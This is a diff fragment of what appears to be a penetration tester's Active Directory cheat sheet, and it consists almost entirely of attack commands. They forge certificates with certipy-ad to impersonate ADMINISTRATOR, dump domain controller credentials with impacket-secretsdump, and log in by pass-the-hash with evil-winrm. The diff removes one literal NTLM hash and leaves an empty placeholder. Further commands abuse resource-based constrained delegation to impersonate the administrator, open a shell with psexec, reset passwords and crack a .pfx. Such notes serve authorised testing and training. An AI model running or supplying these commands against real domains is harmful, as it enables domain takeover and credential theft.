@@ -432,8 +432,8 @@ certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=
 certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
 certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
-sudo ntpdate -u $TARGET; impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
-evil-winrm -i $TARGET -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
+impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+evil-winrm -i $TARGET -u administrator -H ''
 
 +---------- Crack ----------+
 pfx2john user.pfx
@@ -653,8 +653,9 @@ impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegat
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
 impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"
 export KRB5CCNAME=`pwd`/administrator
+impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
-impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
+evil-winrm -i $TARGET -u administrator -H ''
 
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
